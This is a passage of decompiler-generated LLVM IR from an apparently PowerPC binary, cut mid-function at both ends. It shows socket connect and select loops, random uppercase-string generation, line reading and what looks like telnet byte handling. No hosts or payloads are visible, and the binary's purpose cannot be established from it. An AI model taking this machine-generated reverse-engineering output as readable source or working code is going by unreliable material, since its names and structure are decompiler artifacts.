  %v2_10002460 = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10002414 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10002460

dec_label_pc_1000240c:                            ; preds = %dec_label_pc_10002460
  store i32 268444696, i32* @lr, align 4
  %v2_10002414 = call i32 @function_1000213c(i8* %v1_10002414)
  store i32 268444716, i32* @lr, align 4
  %v5_10002428 = call i32 @function_1000e1b0(i32 %v2_10002460, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017b2c.38, i32 0, i32 0), i32 268500992)
  %v4_10002434 = icmp eq i32 %v5_10002428, %v2_10002460
  br i1 %v4_10002434, label %dec_label_pc_1000243c, label %dec_label_pc_10002448

dec_label_pc_1000243c:                            ; preds = %dec_label_pc_1000240c
  %v1_10002440 = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10002448

dec_label_pc_10002448:                            ; preds = %dec_label_pc_1000240c, %dec_label_pc_1000243c
  %stack_var_-4116.0 = phi i32 [ %v1_10002440, %dec_label_pc_1000243c ], [ %stack_var_-4116.1, %dec_label_pc_1000240c ]
  store i32 268444768, i32* @lr, align 4
  %v3_1000245c = call i32 @function_1000dd4c(i32 %v2_10002460, i32 0, i32 4096)
  br label %dec_label_pc_10002460

dec_label_pc_10002460:                            ; preds = %dec_label_pc_100023d0, %dec_label_pc_10002448
  %stack_var_-4116.1 = phi i32 [ 0, %dec_label_pc_100023d0 ], [ %stack_var_-4116.0, %dec_label_pc_10002448 ]
  %v3_10002470 = call i32 @function_10001d64(i32 %v2_10002460, i32 4096, i32 %v3_100023fc)
  %v3_10002478 = icmp eq i32 %v3_10002470, 0
  br i1 %v3_10002478, label %dec_label_pc_10002480, label %dec_label_pc_1000240c

dec_label_pc_10002480:                            ; preds = %dec_label_pc_10002460
  store i32 268444808, i32* @lr, align 4
  %v1_10002484 = call i32 @function_1000c2f4(i32 %v3_100023fc)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10002460, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10002460, { 1, 0 }
  uselistorder label %dec_label_pc_10002448, { 1, 0 }
}

define i32 @function_100024a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100024a8:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_100024c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_100025404 = icmp sgt i32 %arg2, 0
  br i1 %v2_100025404, label %dec_label_pc_100024dc, label %dec_label_pc_10002548

dec_label_pc_100024dc:                            ; preds = %dec_label_pc_100024a8, %dec_label_pc_100024dc
  %storemerge37 = phi i32 [ %v1_10002530, %dec_label_pc_100024dc ], [ 0, %dec_label_pc_100024a8 ]
  %v2_100024e8 = add i32 %storemerge37, %v0_100024c0
  %v0_100024ec = call i32 @function_10000468()
  store i32 %v0_100024ec, i32* %r3.global-to-local, align 4
  %v1_10002500 = urem i32 %v0_100024ec, 26
  %fold = add nuw nsw i32 %v1_10002500, 65
  %v1_10002528 = trunc i32 %fold to i8
  %v3_10002528 = inttoptr i32 %v2_100024e8 to i8*
  store i8 %v1_10002528, i8* %v3_10002528, align 1
  %v1_10002530 = add nuw nsw i32 %storemerge37, 1
  %v2_10002540 = icmp slt i32 %v1_10002530, %arg2
  br i1 %v2_10002540, label %dec_label_pc_100024dc, label %dec_label_pc_10002538.dec_label_pc_10002548_crit_edge

dec_label_pc_10002538.dec_label_pc_10002548_crit_edge: ; preds = %dec_label_pc_100024dc
  %v0_10002560.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002548

dec_label_pc_10002548:                            ; preds = %dec_label_pc_10002538.dec_label_pc_10002548_crit_edge, %dec_label_pc_100024a8
  %v0_10002560 = phi i32 [ %v0_10002560.pre, %dec_label_pc_10002538.dec_label_pc_10002548_crit_edge ], [ %v0_100024c0, %dec_label_pc_100024a8 ]
  ret i32 %v0_10002560

; uselistorder directives
  uselistorder i32 %v1_10002530, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_100024c0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100024dc, { 1, 0 }
}

define i32 @function_10002564(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002564:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1000259c.41 to i32), i32* @lr, align 4
  %v4_10002598 = call i32 @function_1000dd4c(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_100025ac = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_100025c0

dec_label_pc_100025c0:                            ; preds = %dec_label_pc_10002564, %dec_label_pc_100025c0
  %storemerge618 = phi i32 [ 0, %dec_label_pc_10002564 ], [ %v1_100025dc, %dec_label_pc_100025c0 ]
  %v1_100025c8 = mul nuw nsw i32 %storemerge618, 4
  %v2_100025cc = add i32 %v1_100025c8, %v2_100025ac
  %v2_100025d4 = inttoptr i32 %v2_100025cc to i32*
  store i32 0, i32* %v2_100025d4, align 4
  %v1_100025dc = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_100025dc, 32
  br i1 %tmp42, label %dec_label_pc_100025c0, label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c0
  %v1_100025f4 = udiv i32 %arg1, 32
  %v1_100025fc = mul nuw nsw i32 %v1_100025f4, 4
  %v2_10002600 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002604 = add nuw nsw i32 %v1_100025fc, 32
  %v1_10002608 = add i32 %v2_10002604, %v2_10002600
  %v1_1000260c = inttoptr i32 %v1_10002608 to i32*
  %v2_1000260c = load i32, i32* %v1_1000260c, align 4
  %v1_10002614 = urem i32 %arg1, 32
  %v3_1000261c = shl i32 1, %v1_10002614
  %v2_10002620 = or i32 %v2_1000260c, %v3_1000261c
  store i32 %v2_10002620, i32* %v1_1000260c, align 4
  %v1_1000263c = add i32 %arg1, 1
  %v2_10002648 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268445284, i32* @lr, align 4
  %v5_10002660 = call i32 @function_1000c684(i32 %v1_1000263c, i32 %v2_100025ac, i32 0, i32 %v2_100025ac, i32 %v2_10002648)
  %v2_10002670 = icmp sgt i32 %v5_10002660, 0
  br i1 %v2_10002670, label %dec_label_pc_1000281c.preheader, label %dec_label_pc_10002780.preheader

dec_label_pc_10002780.preheader:                  ; preds = %dec_label_pc_100025f0
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_1000267c, label %dec_label_pc_1000281c.preheader

dec_label_pc_1000267c:                            ; preds = %dec_label_pc_10002780.preheader, %dec_label_pc_10002774
  %stack_var_-176.017 = phi i32 [ %v1_10002778, %dec_label_pc_10002774 ], [ %tmp25, %dec_label_pc_10002780.preheader ]
  %v3_10002680 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 ptrtoint (i32* @global_var_10002698.44 to i32), i32* @lr, align 4
  %v4_10002694 = call i32 @function_100017e4(i32 %v3_10002680, i32 ptrtoint ([5 x i8]* @global_var_10017b38.43 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_100025ac, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge

dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge: ; preds = %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge, %dec_label_pc_1000267c
  %v3_100026c0.pre = phi i32 [ %v2_100025ac, %dec_label_pc_1000267c ], [ %v3_100026c0.pre.pre, %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge ]
  %v1_100026d849 = phi i32 [ 1, %dec_label_pc_1000267c ], [ %v1_100026d8, %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge ]
  %v1_100026c4 = mul nuw nsw i32 %v1_100026d849, 4
  %v2_100026c8 = add i32 %v1_100026c4, %v3_100026c0.pre
  %v2_100026d0 = inttoptr i32 %v2_100026c8 to i32*
  store i32 0, i32* %v2_100026d0, align 4
  %v1_100026d8 = add nuw nsw i32 %v1_100026d849, 1
  %tmp44 = icmp ult i32 %v1_100026d8, 32
  br i1 %tmp44, label %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge, label %dec_label_pc_100026ec

dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge: ; preds = %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge
  %v3_100026c0.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge

dec_label_pc_100026ec:                            ; preds = %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge
  %v2_10002708 = load i32, i32* %v1_1000260c, align 4
  %v2_1000271c = or i32 %v2_10002708, %v3_1000261c
  store i32 %v2_1000271c, i32* %v1_1000260c, align 4
  store i32 268445536, i32* @lr, align 4
  %v5_1000275c = call i32 @function_1000c684(i32 %v1_1000263c, i32 %v2_100025ac, i32 0, i32 %v2_100025ac, i32 %v2_10002648)
  %v2_1000276c = icmp sgt i32 %v5_1000275c, 0
  br i1 %v2_1000276c, label %dec_label_pc_1000281c.preheader, label %dec_label_pc_10002774

dec_label_pc_10002774:                            ; preds = %dec_label_pc_100026ec
  %v1_10002778 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10002778, 10
  br i1 %tmp45, label %dec_label_pc_1000267c, label %dec_label_pc_1000281c.preheader

dec_label_pc_1000281c.preheader:                  ; preds = %dec_label_pc_10002774, %dec_label_pc_100026ec, %dec_label_pc_10002780.preheader, %dec_label_pc_100025f0
  %v2_100027a8 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_1000281c

dec_label_pc_100027a0:                            ; preds = %dec_label_pc_1000281c
  %v3_100027a4 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 268445632, i32* @lr, align 4
  %v4_100027bc = call i32 @function_1000ec70(i32 %v3_100027a4, i32 %v2_100027a8, i32 1, i32 0)
  %v3_100027c4 = icmp eq i32 %v4_100027bc, 1
  br i1 %v3_100027c4, label %dec_label_pc_100027e4, label %dec_label_pc_100027cc

dec_label_pc_100027cc:                            ; preds = %dec_label_pc_100027a0
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_10002858

dec_label_pc_100027e4:                            ; preds = %dec_label_pc_100027a0
  %v3_100027e4 = load i8, i8* %stack_var_-32, align 1
  %v4_100027ec = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_100027e4, i8* %stack_var_-180.0, align 1
  %v1_100027f8 = add i32 %v4_100027ec, 1
  %v5_100027fc = inttoptr i32 %v1_100027f8 to i8*
  %v3_10002800 = load i8, i8* %stack_var_-32, align 1
  %v3_10002808 = icmp eq i8 %v3_10002800, 10
  br i1 %v3_10002808, label %dec_label_pc_10002844, label %dec_label_pc_10002810

dec_label_pc_10002810:                            ; preds = %dec_label_pc_100027e4
  %v1_10002814 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_1000281c

dec_label_pc_1000281c:                            ; preds = %dec_label_pc_1000281c.preheader, %dec_label_pc_10002810
  %stack_var_-180.0 = phi i8* [ %v5_100027fc, %dec_label_pc_10002810 ], [ %arg2, %dec_label_pc_1000281c.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_10002814, %dec_label_pc_10002810 ], [ 0, %dec_label_pc_1000281c.preheader ]
  %v0_10002824 = call i32 @__asm_mfcr()
  %v1_10002828 = call i32 @__asm_rlwinm(i32 %v0_10002824, i32 30, i32 31, i32 31)
  %v1_1000282c = urem i32 %v1_10002828, 256
  %v3_1000283c = icmp eq i32 %v1_1000282c, 0
  br i1 %v3_1000283c, label %dec_label_pc_10002844, label %dec_label_pc_100027a0

dec_label_pc_10002844:                            ; preds = %dec_label_pc_1000281c, %dec_label_pc_100027e4
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_1000281c ], [ %v5_100027fc, %dec_label_pc_100027e4 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_10002858

dec_label_pc_10002858:                            ; preds = %dec_label_pc_100027cc, %dec_label_pc_10002844
  %storemerge = phi i32 [ -1, %dec_label_pc_100027cc ], [ %stack_var_-184.0, %dec_label_pc_10002844 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_100027fc, { 1, 0 }
  uselistorder i32 %v1_10002778, { 1, 0 }
  uselistorder i32 %v1_100026d8, { 1, 0 }
  uselistorder i32 %v2_10002648, { 1, 0 }
  uselistorder i32* %v1_1000260c, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_100025ac, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002858, { 1, 0 }
  uselistorder label %dec_label_pc_1000281c, { 1, 0 }
  uselistorder label %dec_label_pc_1000267c, { 1, 0 }
  uselistorder label %dec_label_pc_100025c0, { 1, 0 }
}

define i32 @function_10002878(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10002878:
  %stack_var_-16 = alloca i32, align 4
  store i32 268445852, i32* @lr, align 4
  %v1_10002898 = call i32 @function_1000e834(i32 %arg1)
  %v3_100028a8 = icmp eq i32 %v1_10002898, 0
  br i1 %v3_100028a8, label %dec_label_pc_100028b0, label %dec_label_pc_100028c8

dec_label_pc_100028b0:                            ; preds = %dec_label_pc_10002878
  store i32 ptrtoint (i32* @global_var_100028bc.46 to i32), i32* @lr, align 4
  %v4_100028b8 = call i32 @function_1000e6c4(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017b40.45, i32 0, i32 0), i32 268500992)
  br label %dec_label_pc_1000294c

dec_label_pc_100028c8:                            ; preds = %dec_label_pc_10002878
  %v1_100028cc = add i32 %v1_10002898, 16
  %v2_100028cc = inttoptr i32 %v1_100028cc to i32*
  %v3_100028cc = load i32, i32* %v2_100028cc, align 4
  %v1_100028f0 = inttoptr i32 %v3_100028cc to i32*
  %v2_100028f0 = load i32, i32* %v1_100028f0, align 4
  %v3_100028f4 = icmp eq i32 %v2_100028f0, 0
  br i1 %v3_100028f4, label %dec_label_pc_10002944, label %dec_label_pc_100028fc

dec_label_pc_100028fc:                            ; preds = %dec_label_pc_100028c8
  %v2_10002910 = load i32, i32* %v1_100028f0, align 4
  %v1_10002914 = inttoptr i32 %v2_10002910 to i32*
  %v2_10002914 = load i32, i32* %v1_10002914, align 4
  store i32 %v2_10002914, i32* %stack_var_-16, align 4
  store i32 268445992, i32* @lr, align 4
  %v3_10002924 = call i32 @function_1000e7cc(i32* nonnull %stack_var_-16, i32 %v2_10002910)
  %v2_10002934 = inttoptr i32 %v3_10002924 to i8*
  %v3_10002934 = call i32 @function_1000df40(i32 %arg2, i8* %v2_10002934)
  br label %dec_label_pc_1000294c

dec_label_pc_10002944:                            ; preds = %dec_label_pc_100028c8
  br label %dec_label_pc_1000294c

dec_label_pc_1000294c:                            ; preds = %dec_label_pc_100028fc, %dec_label_pc_100028b0, %dec_label_pc_10002944
  %stack_var_-12.0 = phi i32 [ 1, %dec_label_pc_100028b0 ], [ 1, %dec_label_pc_10002944 ], [ 0, %dec_label_pc_100028fc ]
  ret i32 %stack_var_-12.0

; uselistorder directives
  uselistorder label %dec_label_pc_1000294c, { 2, 0, 1 }
}

define i32 @function_1000296c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000296c:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268446116, i32* @lr, align 4
  %v2_100029a0 = call i32 @function_1000c140(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100029cc.48 to i32), i32* @lr, align 4
  %v2_100029c8 = call i32 @function_1000c140(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100029d8 = urem i32 %arg3, 65536
  store i32 %v1_100029d8, i32* @r3, align 4
  %v1_100029e0 = call i32 @function_1000e698(i32 %v1_100029d8)
  %v2_100029f0 = ptrtoint i32* %stack_var_-200 to i32
  %v4_10002a00 = call i32 @function_100020c0(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100029f0)
  %v3_10002a08 = icmp eq i32 %v4_10002a00, 0
  br i1 %v3_10002a08, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a10

dec_label_pc_10002a10:                            ; preds = %dec_label_pc_1000296c
  br label %dec_label_pc_10002bdc

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_1000296c
  store i32 268446280, i32* @lr, align 4
  %v3_10002a44 = call i32 @function_1000ebcc(i32 %arg1, i32 %v2_100029f0, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002a44, -1
  br i1 %tmp26, label %dec_label_pc_10002b98, label %dec_label_pc_10002a5c

dec_label_pc_10002a5c:                            ; preds = %dec_label_pc_10002a1c
  %v0_10002a5c = call i32 @function_1000c85c()
  %v1_10002a64 = inttoptr i32 %v0_10002a5c to i32*
  %v2_10002a64 = load i32, i32* %v1_10002a64, align 4
  %v3_10002a68 = icmp eq i32 %v2_10002a64, 115
  br i1 %v3_10002a68, label %dec_label_pc_10002a70, label %dec_label_pc_10002b8c

dec_label_pc_10002a70:                            ; preds = %dec_label_pc_10002a5c
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002a80 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002a80, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge

dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge: ; preds = %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge, %dec_label_pc_10002a70
  %v3_10002a98.pre = phi i32 [ %v2_10002a80, %dec_label_pc_10002a70 ], [ %v3_10002a98.pre.pre, %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge ]
  %v1_10002ab030 = phi i32 [ 1, %dec_label_pc_10002a70 ], [ %v1_10002ab0, %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge ]
  %v1_10002a9c = mul nuw nsw i32 %v1_10002ab030, 4
  %v2_10002aa0 = add i32 %v1_10002a9c, %v3_10002a98.pre
  %v2_10002aa8 = inttoptr i32 %v2_10002aa0 to i32*
  store i32 0, i32* %v2_10002aa8, align 4
  %v1_10002ab0 = add nuw nsw i32 %v1_10002ab030, 1
  %tmp27 = icmp ult i32 %v1_10002ab0, 32
  br i1 %tmp27, label %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge, label %dec_label_pc_10002ac4

dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge: ; preds = %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge
  %v3_10002a98.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge

dec_label_pc_10002ac4:                            ; preds = %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge
  %v1_10002ac8 = udiv i32 %arg1, 32
  %v1_10002ad0 = mul nuw nsw i32 %v1_10002ac8, 4
  %v2_10002ad4 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002ad8 = add nuw nsw i32 %v1_10002ad0, 32
  %v1_10002adc = add i32 %v2_10002ad8, %v2_10002ad4
  %v1_10002ae0 = inttoptr i32 %v1_10002adc to i32*
  %v2_10002ae0 = load i32, i32* %v1_10002ae0, align 4
  %v1_10002ae8 = urem i32 %arg1, 32
  %v3_10002af0 = shl i32 1, %v1_10002ae8
  %v2_10002af4 = or i32 %v2_10002ae0, %v3_10002af0
  store i32 %v2_10002af4, i32* %v1_10002ae0, align 4
  %v1_10002b10 = add i32 %arg1, 1
  %v2_10002b18 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268446516, i32* @lr, align 4
  %v5_10002b30 = call i32 @function_1000c684(i32 %v1_10002b10, i32 0, i32 %v2_10002a80, i32 0, i32 %v2_10002b18)
  %tmp28 = icmp slt i32 %v5_10002b30, 1
  br i1 %tmp28, label %dec_label_pc_10002b80, label %dec_label_pc_10002b40

dec_label_pc_10002b40:                            ; preds = %dec_label_pc_10002ac4
  store i32 4, i32* %stack_var_-48, align 4
  %v2_10002b48 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002b4c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268446568, i32* @lr, align 4
  %v5_10002b64 = call i32 @function_1000ec34(i32 %arg1, i32 1, i32 4, i32 %v2_10002b48, i32 %v2_10002b4c)
  %v3_10002b68 = load i32, i32* %stack_var_-44, align 4
  %v3_10002b6c = icmp eq i32 %v3_10002b68, 0
  br i1 %v3_10002b6c, label %dec_label_pc_10002b98, label %dec_label_pc_10002b74

dec_label_pc_10002b74:                            ; preds = %dec_label_pc_10002b40
  br label %dec_label_pc_10002bdc

dec_label_pc_10002b80:                            ; preds = %dec_label_pc_10002ac4
  br label %dec_label_pc_10002bdc

dec_label_pc_10002b8c:                            ; preds = %dec_label_pc_10002a5c
  br label %dec_label_pc_10002bdc

dec_label_pc_10002b98:                            ; preds = %dec_label_pc_10002b40, %dec_label_pc_10002a1c
  store i32 268446636, i32* @lr, align 4
  %v2_10002ba8 = call i32 @function_1000c140(i32 %arg1, i32 3)
  %v1_10002bb8 = call i32 @__asm_rlwinm(i32 %v2_10002ba8, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_10002bd4.49 to i32), i32* @lr, align 4
  %v2_10002bd0 = call i32 @function_1000c140(i32 %arg1, i32 4)
  br label %dec_label_pc_10002bdc

dec_label_pc_10002bdc:                            ; preds = %dec_label_pc_10002b8c, %dec_label_pc_10002b80, %dec_label_pc_10002b74, %dec_label_pc_10002a10, %dec_label_pc_10002b98
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_10002b98 ], [ 0, %dec_label_pc_10002b80 ], [ 0, %dec_label_pc_10002b74 ], [ 0, %dec_label_pc_10002b8c ], [ 0, %dec_label_pc_10002a10 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002ab0, { 1, 0 }
  uselistorder i32 %v2_10002a80, { 1, 0, 2 }
  uselistorder i32 %v2_100029f0, { 1, 0 }
  uselistorder i32 %v1_100029d8, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_10002bdc, { 4, 0, 1, 2, 3 }
}

define i32 @function_10002bfc() local_unnamed_addr {
dec_label_pc_10002bfc:
  store i32 268446740, i32* @lr, align 4
  %v0_10002c10 = call i32 @function_1000c384()
  %v3_10002c20 = icmp eq i32 %v0_10002c10, 0
  br i1 %v3_10002c20, label %dec_label_pc_10002da4, label %dec_label_pc_10002c34

dec_label_pc_10002c34:                            ; preds = %dec_label_pc_10002bfc
  %v3_10002c3c = load i32, i32* @global_var_1002b904.51, align 4
  %v2_10002c40 = load i32, i32* @global_var_1002b900.50, align 4
  %v1_10002c44 = add i32 %v3_10002c3c, 1
  %v2_10002c44 = icmp eq i32 %v3_10002c3c, -1
  %v2_10002c48 = zext i1 %v2_10002c44 to i32
  %v3_10002c48 = add i32 %v2_10002c48, %v2_10002c40
  store i32 %v3_10002c48, i32* @global_var_1002b900.50, align 4
  store i32 %v1_10002c44, i32* @global_var_1002b904.51, align 4
  %v1_10002c78 = mul i32 %v1_10002c44, 4
  %v1_10002c80 = add i32 %v1_10002c78, 4
  store i32 268446860, i32* @lr, align 4
  %v1_10002c88 = call i32 @function_1000ef60(i32 %v1_10002c80)
  br label %dec_label_pc_10002ce0

dec_label_pc_10002ca0:                            ; preds = %dec_label_pc_10002ce0, %dec_label_pc_10002d30
  %v1_10002ca4 = mul i32 %storemerge2, 4
  %v2_10002cb0 = add i32 %v1_10002ca4, %v1_10002c88
  %v3_10002cc4 = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_10002cc8 = add i32 %v3_10002cc4, %v1_10002ca4
  %v1_10002ccc = inttoptr i32 %v2_10002cc8 to i32*
  %v2_10002ccc = load i32, i32* %v1_10002ccc, align 4
  %v2_10002cd0 = inttoptr i32 %v2_10002cb0 to i32*
  store i32 %v2_10002ccc, i32* %v2_10002cd0, align 4
  %v1_10002cd8 = add i32 %storemerge2, 1
  br label %dec_label_pc_10002ce0

dec_label_pc_10002ce0:                            ; preds = %dec_label_pc_10002c34, %dec_label_pc_10002ca0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002c34 ], [ %v1_10002cd8, %dec_label_pc_10002ca0 ]
  %v3_10002d08 = load i32, i32* @global_var_1002b904.51, align 4
  %v2_10002d0c = load i32, i32* @global_var_1002b900.50, align 4
  %v2_10002d10 = icmp ne i32 %v3_10002d08, 0
  %v3_10002d14 = add i32 %v2_10002d0c, -1
  %v4_10002d14 = sext i1 %v2_10002d10 to i32
  %v3_10002d28 = icmp eq i32 %v3_10002d14, %v4_10002d14
  br i1 %v3_10002d28, label %dec_label_pc_10002d30, label %dec_label_pc_10002ca0

dec_label_pc_10002d30:                            ; preds = %dec_label_pc_10002ce0
  %v1_10002d10 = add i32 %v3_10002d08, -1
  %v3_10002d48 = icmp ugt i32 %v1_10002d10, %storemerge2
  br i1 %v3_10002d48, label %dec_label_pc_10002ca0, label %dec_label_pc_10002d50

dec_label_pc_10002d50:                            ; preds = %dec_label_pc_10002d30
  %v1_10002d64 = mul i32 %v3_10002d08, 4
  %v2_10002d70 = add i32 %v1_10002c88, -4
  %v1_10002d74 = add i32 %v2_10002d70, %v1_10002d64
  %v2_10002d7c = inttoptr i32 %v1_10002d74 to i32*
  store i32 %v0_10002c10, i32* %v2_10002d7c, align 4
  %v3_10002d84 = load i32, i32* @global_var_1002b92c.52, align 4
  store i32 268447120, i32* @lr, align 4
  %v1_10002d8c = call i32 @function_1000f0b8(i32 %v3_10002d84)
  store i32 %v1_10002c88, i32* @global_var_1002b92c.52, align 4
  br label %dec_label_pc_10002da4

dec_label_pc_10002da4:                            ; preds = %dec_label_pc_10002bfc, %dec_label_pc_10002d50
  ret i32 %v0_10002c10

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002ca4, { 1, 0 }
  uselistorder i32 %v1_10002c88, { 1, 2, 0 }
  uselistorder i32 %v3_10002c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10002da4, { 1, 0 }
  uselistorder label %dec_label_pc_10002ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10002ca0, { 1, 0 }
}

define i32 @function_10002dc4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002dc4:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002de8 = add i32 %arg2, 1
  %v1_10002dec = inttoptr i32 %v1_10002de8 to i8*
  %v2_10002dec = load i8, i8* %v1_10002dec, align 1
  %v1_10002dfc = icmp ult i8 %v2_10002dec, -5
  br i1 %v1_10002dfc, label %dec_label_pc_10002f54, label %dec_label_pc_10002e04

dec_label_pc_10002e04:                            ; preds = %dec_label_pc_10002dc4
  %v2_10002e08 = icmp eq i8 %v2_10002dec, -1
  br i1 %v2_10002e08, label %dec_label_pc_10002e10, label %dec_label_pc_10002e2c

dec_label_pc_10002e10:                            ; preds = %dec_label_pc_10002e04
  br label %dec_label_pc_10002f54

dec_label_pc_10002e2c:                            ; preds = %dec_label_pc_10002e04
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002e38 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268447308, i32* @lr, align 4
